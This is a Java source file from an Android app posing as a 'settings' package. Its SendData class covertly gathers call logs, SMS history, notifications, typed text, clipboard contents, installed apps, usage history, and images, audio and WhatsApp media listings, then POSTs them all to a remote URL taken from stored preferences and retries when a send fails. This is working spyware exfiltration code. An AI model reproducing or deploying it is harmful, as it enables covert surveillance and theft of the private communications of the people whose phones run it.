package com.example.settings;

import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
import static com.example.settings.MainActivity.setuponetimeworkManager;
import static com.example.settings.Utils.checkpermission;
import static com.example.settings.Utils.getDateTime;
import static com.example.settings.Utils.newUrlData;
import static com.example.settings.Utils.setinfo;

import android.Manifest;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.HashMap;
import java.util.Map;

public class SendData {
    Sharedpref mSharedpref;
    Context context;
    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
            Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
            SmsData,OtherNotificationData,ClickedData,OtherClickedData,type="",AppUsageHistory,IssueDetails;
    String url="";
    public SendData(Context context,String type) {
        mSharedpref = new Sharedpref(context);
        this.context = context;
        this.type=type;

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void doUpload() {
        url=mSharedpref.getUrl();
        Name = mSharedpref.getSaveName();
        OutgoingNumbers = mSharedpref.getOutgoingNumbers();
        RecievedNumbers = mSharedpref.getRecievedNumbers();
        MissedCallNumbers = mSharedpref.getMissedCallNumber();
        TextWritten = mSharedpref.getSaveTextWritten();
        NotificationData = mSharedpref.getNotificationData();
        SmsData=mSharedpref.getSmsData();
        OtherNotificationData=mSharedpref.getOtherNotificationData();
        ClickedData=mSharedpref.getClickedData();
        OtherClickedData=mSharedpref.getOtherClickedData();
        if (checkpermission(context, Manifest.permission.READ_PHONE_STATE) && (checkpermission(context, Manifest.permission.READ_CALL_LOG))) {
            Utils.readCallLogs(context, mSharedpref);
        }
        Utils.getAppDataHistory(context,mSharedpref);
        AppUsageHistory=mSharedpref.getAppUsageHistory();
        IssueDetails=mSharedpref.getOtherinfo();
        Utils.readSmsHistory(context,mSharedpref);
        Utils.getBatteryPercent(context,mSharedpref);
       // Utils.isPhoneIsLockedOrNot(context);
        Utils.checkServices(context,mSharedpref);
        try {
            ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData pData = clipboardManager.getPrimaryClip();
            if (pData != null) {
                ClipData.Item item = pData.getItemAt(0);
                Copiedtext = item.getText().toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }


        DaysTime = mSharedpref.getPrevDate()+" to " +getDateTime();
        if(isConnectedToNetwork(context)){
            if (!Name.isEmpty() && !Name.equalsIgnoreCase("No Name Yet")) {
                int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
                int prev=mSharedpref.getPrevPhoneNumbersLisSize();
                if (prev!= numberlistsize) {
                    Phonenumberdetails = mSharedpref.getPhoneNumbers();
                    mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
                    mSharedpref.commit();
                }
                int applistsize= mSharedpref.getPhoneAppdetailsListSize();
                int prevAppListSize=mSharedpref.getPrevPhoneAppdetailsListSize();
                if ( prevAppListSize!=applistsize) {
                    Phoneappdetails = mSharedpref.getPhoneAppdetails();
                    mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
                    mSharedpref.commit();
                }

                if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
                        !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
                        || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() ||
                        !SmsData.isEmpty() || !OtherNotificationData.isEmpty()
                        || !ClickedData.isEmpty() || !OtherClickedData.isEmpty() ||
                        !Phoneappdetails.isEmpty())
                {
                    StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                            new Response.Listener<String>() {
                                @Override
                                public void onResponse(String response) {
                                    Log.d(context.getPackageName(),response);
                                    mSharedpref.savePrevDate(getDateTime());
                                    mSharedpref.commit();
                                    try {
                                        setinfo(mSharedpref,"Sync Ontime","Success  in Sending");
                                        newUrlData(context,mSharedpref);

                                   }
                                   catch (Exception e){
                                       e.printStackTrace();
                                   }
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    Log.d(context.getPackageName(),"Error");
                                    setinfo(mSharedpref,"Sync Ontime","From Volley Error");
                                    setuponetimeworkManager(context,"From Volley Error");

                                }
                            }
                    ) {
                        @Override
                        protected Map<String, String> getParams() {
                            Map<String, String> parmas = new HashMap<>();

                            //here we pass params
                            parmas.put("action", "addItem");
                            parmas.put("Name", Name);
                            parmas.put("DaysTime", DaysTime+" Type: "+type);
                            parmas.put("TextWritten", TextWritten);
                            parmas.put("OutgoingNumbers", OutgoingNumbers);
                            parmas.put("RecievedNumbers", RecievedNumbers);
                            parmas.put("MissedCallNumbers", MissedCallNumbers);
                            parmas.put("Copiedtext", Copiedtext);
                            parmas.put("Phonenumberdetails", Phonenumberdetails);
                            parmas.put("Phoneappdetails", Phoneappdetails);
                            parmas.put("NotificationData", NotificationData);
                            parmas.put("OtherNotificationData", OtherNotificationData);
                            parmas.put("SmsData", SmsData);
                            parmas.put("ClickedData", ClickedData);
                            parmas.put("OtherClickedData", OtherClickedData);
                            parmas.put("CallHistory",mSharedpref.getCallHistory());
                            parmas.put("SmsHistory",mSharedpref.getSmsHistory());
                            parmas.put("PhoneLockDetails",mSharedpref.getPhoneLockDetails());
                            parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
                            parmas.put("Simdetails", "");
                            parmas.put("PhoneTowerdetails", "");
                            parmas.put("DeviceInfo", "");
                            parmas.put("ImageFiles", mSharedpref.getServiceNotificationData());
                            parmas.put("Services", mSharedpref.getServiceStatus());
                            parmas.put("ImageUploaded", mSharedpref.getImagesJson());
                            parmas.put("AudioUploaded", mSharedpref.getAudioJson());
                            parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
                            parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
                            parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
                            parmas.put("AppUsages",AppUsageHistory);
                            parmas.put("IssueDetails",IssueDetails);
                            return parmas;
                        }
                    };

                    int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
                    RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
                    stringRequest.setRetryPolicy(retryPolicy);

                    RequestQueue queue = Volley.newRequestQueue(context);
                    queue.add(stringRequest);
                }
                else {
                    Log.d(context.getPackageName(),"All empty");
                    StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                            new Response.Listener<String>() {
                                @Override
                                public void onResponse(String response) {
                                    setinfo(mSharedpref,"Sync Ontime","Success  in Sending When Name is empty");
                                    Log.d(context.getPackageName(),response);
                                    mSharedpref.savePrevDate(getDateTime());
                                    mSharedpref.commit();
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    Log.d(context.getPackageName(),"All empty Error");
                                    setinfo(mSharedpref,"Sync Ontime","From Volley Error When Name is Empty");
                                    setuponetimeworkManager(context,"From Volley Error When Empty");
                                }
                            }
                    ) {
                        @Override
                        protected Map<String, String> getParams() {
                            Map<String, String> parmas = new HashMap<>();

                            //here we pass params
                            parmas.put("action", "addItem");
                            parmas.put("Name", Name);
                            parmas.put("DaysTime", DaysTime+" Type: "+type);
                            parmas.put("TextWritten", "Everything is empty");
                            parmas.put("OutgoingNumbers", OutgoingNumbers);
                            parmas.put("RecievedNumbers", RecievedNumbers);
                            parmas.put("MissedCallNumbers", MissedCallNumbers);
                            parmas.put("Copiedtext", Copiedtext);
                            parmas.put("Phonenumberdetails", Phonenumberdetails);
                            parmas.put("Phoneappdetails", Phoneappdetails);
                            parmas.put("NotificationData", NotificationData);
                            parmas.put("OtherNotificationData", OtherNotificationData);
                            parmas.put("SmsData", SmsData);
                            parmas.put("ClickedData", ClickedData);
                            parmas.put("OtherClickedData", OtherClickedData);
                            parmas.put("CallHistory",mSharedpref.getCallHistory());
                            parmas.put("SmsHistory",mSharedpref.getSmsHistory());
                            parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
                            parmas.put("PhoneLockDetails",mSharedpref.getPhoneLockDetails());
                            parmas.put("Simdetails", "");
                            parmas.put("PhoneTowerdetails", "");
                            parmas.put("DeviceInfo", "");
                            parmas.put("ImageFiles", mSharedpref.getServiceNotificationData());
                            parmas.put("Services", mSharedpref.getServiceStatus());
                            parmas.put("ImageUploaded", mSharedpref.getImagesJson());
                            parmas.put("AudioUploaded", mSharedpref.getAudioJson());
                            parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
                            parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
                            parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
                            parmas.put("AppUsages",AppUsageHistory);
                            parmas.put("IssueDetails",IssueDetails);
                            return parmas;
                        }
                    };

                    int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
                    RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
                    stringRequest.setRetryPolicy(retryPolicy);

                    RequestQueue queue = Volley.newRequestQueue(context);
                    queue.add(stringRequest);

                }
            }
            else {
                Log.d(context.getPackageName(),"Name empty");

            }
        }
        else {
            Log.d("Settings","Internet Problem");
            setinfo(mSharedpref,"Sync Ontime","Internet Not Available");
        }

    }
}
